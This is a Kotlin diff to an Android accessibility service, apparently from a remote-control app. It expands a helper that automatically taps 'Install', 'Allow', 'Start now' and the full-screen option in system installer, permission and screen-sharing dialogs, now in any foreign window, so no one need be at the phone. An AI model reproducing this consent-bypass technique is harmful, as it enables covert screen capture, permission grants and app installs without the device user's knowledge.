@@ -80,9 +80,14 @@ class ControlAccessibilityService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        val evPkg = event?.packageName?.toString()
         if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            onForeground(event.packageName?.toString())
-            maybeAutoConfirm(event.packageName?.toString())
+            onForeground(evPkg)
+            maybeAutoConfirm(evPkg)
+        } else if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            // Hộp thoại chia sẻ màn hình dựng nội dung sau khi mở (ô chọn phạm vi, nút Bắt đầu),
+            // nên phải bắt cả sự kiện nội dung đổi — chỉ nghe window-state là bỏ lỡ.
+            maybeAutoConfirm(evPkg)
         }
         when (event?.eventType) {
             AccessibilityEvent.TYPE_VIEW_FOCUSED,
@@ -184,7 +189,12 @@ class ControlAccessibilityService : AccessibilityService() {
     // ================================================================ self-update helper
     // Only while our own updater asked for it (a few minutes): press "Install" in the package installer
     // and "Start now" in the screen-capture dialog, so a remote update needs nobody at the phone.
-    private val confirmWords = listOf("Bắt đầu ngay", "Start now", "Bắt đầu", "Start", "Chia sẻ màn hình", "Share screen", "Start sharing", "Cài đặt", "Install", "Cập nhật", "Update", "Tiếp tục", "Continue")
+    private var scopeClicked = false
+    private val confirmWords = listOf(
+        "Bắt đầu ngay", "Start now", "Bắt đầu ghi", "Bắt đầu chia sẻ", "Bắt đầu", "Start",
+        "Chia sẻ màn hình", "Share screen", "Start sharing", "Chia sẻ", "Share",
+        "Cài đặt", "Install", "Cập nhật", "Update", "Tiếp tục", "Continue", "Cho phép", "Allow"
+    )
     private val dontAskWords = listOf("Không hiển thị lại", "Don't show again", "Do not show again")
     // Nhận diện lựa chọn trong ô xổ "phạm vi" của hộp thoại chia sẻ (Android 14+): dựa theo nội dung chữ,
     // vì mỗi hãng ghi khác nhau ("Toàn màn hình" / "Toàn bộ màn hình" / "Chia sẻ toàn bộ màn hình"...).
@@ -199,12 +209,47 @@ class ControlAccessibilityService : AccessibilityService() {
                (s.contains("single") && s.contains("app"))
     }
 
+    /** Các package có thể hiện hộp thoại xác nhận (chia sẻ màn hình, cài đặt, quyền). */
+    private fun isConfirmPkg(pkg: String?): Boolean {
+        if (pkg == null) return false
+        return pkg.contains("systemui") || pkg.contains("packageinstaller") ||
+               pkg.contains("permissioncontroller") || pkg.contains("settings") || pkg == "android"
+    }
+
+    private var confirmRun = 0
+    private var confirmUntil = 0L
+    private var confirmStart = 0L
+
     private fun maybeAutoConfirm(pkg: String?) {
-        if (pkg == null || !Updater.autoConfirmActive(this)) return
-        if (!(pkg.contains("packageinstaller") || pkg == "com.android.systemui" || pkg.contains("permissioncontroller"))) return
-        // Hộp thoại chia sẻ của Samsung cần tới 2 bước (mở ô xổ → chọn toàn màn hình → bấm Bắt đầu),
-        // mỗi lần confirmNow chỉ làm MỘT bước nên lên lịch nhiều mốc để đi hết chuỗi.
-        for (d in longArrayOf(250, 700, 1300, 2000, 2800, 3800, 5000, 6500)) main.postDelayed({ confirmNow() }, d)
+        if (!Updater.autoConfirmActive(this)) return
+        if (!isConfirmPkg(pkg)) return
+        startConfirmLoop()
+    }
+
+    /**
+     * Quét hộp thoại trong ~25 s, mỗi nhịp làm ĐÚNG MỘT bước (chọn phạm vi → bấm Bắt đầu), vì
+     * hộp thoại chia sẻ của Samsung/Pixel có 2 tầng. Vòng lặp idempotent: nhiều event liên tiếp
+     * không tạo nhiều vòng chạy song song.
+     */
+    private fun startConfirmLoop() {
+        val now = SystemClock.uptimeMillis()
+        if (confirmRun > 0 && now < confirmUntil) return
+        if (now - confirmStart < 2500) return          // chống bão event nội dung (đồng hồ status bar…)
+        confirmStart = now
+        val run = ++confirmRun
+        confirmUntil = now + 25_000
+        scopeClicked = false
+        var misses = 0
+        fun tick() {
+            if (run != confirmRun || !Updater.autoConfirmActive(this)) return
+            val acted = confirmNow()
+            misses = if (acted) 0 else misses + 1
+            val stillThere = allRoots().any { isConfirmPkg(it.packageName?.toString()) }
+            if (misses >= 10 || (!stillThere && misses >= 3)) { if (run == confirmRun) confirmRun = 0; return }
+            if (SystemClock.uptimeMillis() > confirmUntil) { if (run == confirmRun) confirmRun = 0; return }
+            main.postDelayed({ tick() }, if (acted) 320 else 420)
+        }
+        main.postDelayed({ tick() }, 200)
     }
 
     /** Node bấm được: chính nó hoặc cha trong vài cấp (để bỏ qua đoạn mô tả không bấm được). */
@@ -237,35 +282,42 @@ class ControlAccessibilityService : AccessibilityService() {
         return null
     }
 
-    private fun confirmNow() {
-        if (!Updater.autoConfirmActive(this)) return
-        val root = try { rootInActiveWindow } catch (_: Throwable) { null } ?: return
-        val pkg = root.packageName?.toString() ?: return
-        if (!(pkg.contains("packageinstaller") || pkg == "com.android.systemui" || pkg.contains("permissioncontroller"))) return
-        for (w in dontAskWords) for (n in root.findAccessibilityNodeInfosByText(w)) {
-            if (n.isCheckable && !n.isChecked) n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+    /** Bấm đúng MỘT bước trong hộp thoại hệ thống; trả về true nếu vừa bấm gì đó. */
+    private fun confirmNow(): Boolean {
+        if (!Updater.autoConfirmActive(this)) return false
+        // Ưu tiên cửa sổ của hệ thống; nếu máy hãng dùng package riêng (MIUI/ColorOS/Funtouch…) thì
+        // vẫn nhận mọi cửa sổ KHÔNG phải app mình — hộp thoại chia sẻ luôn là cửa sổ ngoài.
+        val all = allRoots()
+        val mine = packageName
+        val roots = all.filter { r ->
+            val p = r.packageName?.toString()
+            isConfirmPkg(p) || (p != null && p != mine && !p.contains("launcher"))
         }
-        // Hộp thoại chia sẻ màn hình: máy Samsung có ô xổ "Một ứng dụng / Toàn (bộ) màn hình".
-        // Danh sách xổ ra nằm ở cửa sổ popup riêng nên phải dò qua TẤT CẢ cửa sổ; mỗi nhịp làm ĐÚNG MỘT việc.
-        if (pkg == "com.android.systemui") {
-            val roots = allRoots()
+        if (roots.isEmpty()) return false
+        for (r in roots) for (w in dontAskWords) for (n in r.findAccessibilityNodeInfosByText(w)) {
+            if (n.isCheckable && !n.isChecked) { n.performAction(AccessibilityNodeInfo.ACTION_CLICK); return true }
+        }
+        // Hộp thoại chia sẻ màn hình: ô chọn phạm vi "Một ứng dụng / Toàn bộ màn hình" (Android 14+).
+        // Danh sách xổ ra nằm ở cửa sổ popup riêng nên phải dò qua TẤT CẢ cửa sổ.
+        if (!scopeClicked) {
             val entire = findClickableOption(roots, "màn hình") { isEntireText(it) }
                 ?: findClickableOption(roots, "screen") { isEntireText(it) }
-            val single = findClickableOption(roots, "ứng dụng") { isSingleText(it) }
-                ?: findClickableOption(roots, "app") { isSingleText(it) }
-            when {
-                entire != null && single != null -> { entire.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
-                single != null && entire == null -> { single.performAction(AccessibilityNodeInfo.ACTION_CLICK); return }
+            if (entire != null) {
+                entire.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                scopeClicked = true
+                return true
             }
         }
-        for (w in confirmWords) for (n in root.findAccessibilityNodeInfosByText(w)) {
+        for (w in confirmWords) for (r in roots) for (n in r.findAccessibilityNodeInfosByText(w)) {
             if (n.text?.toString()?.trim() != w) continue
             var c: AccessibilityNodeInfo? = n
             while (c != null && !c.isClickable) c = c.parent
             if (c != null && c.isEnabled && (c.className?.contains("Button") == true || n.className?.contains("Button") == true)) {
-                c.performAction(AccessibilityNodeInfo.ACTION_CLICK); return
+                c.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                return true
             }
         }
+        return false
     }
 
     // ================================================================ realtime multi-touch ("game mode")
